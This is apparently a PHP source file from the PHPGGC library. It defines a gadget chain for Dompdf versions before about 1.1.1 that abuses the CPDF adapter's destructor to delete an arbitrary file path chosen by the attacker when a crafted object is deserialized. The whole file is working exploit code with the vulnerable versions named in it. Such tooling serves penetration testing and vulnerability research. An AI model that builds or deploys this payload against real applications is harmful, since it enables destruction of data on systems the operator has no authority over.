<?php

namespace GadgetChain\Dompdf;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '? < 1.1.1';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';
    public static $information = '
        Note that some files may not be removed (depends on permissions)
        Target versions: exploitable < commit 61c86c04d2a483187ff9f6a73c50d42669be5b4d, 1 Dec 2021 (~v1.1.1)
    ';

    public function generate(array $parameters)
    {
        return new \Dompdf\Adapter\CPDF($parameters['remote_path']);
    }
}
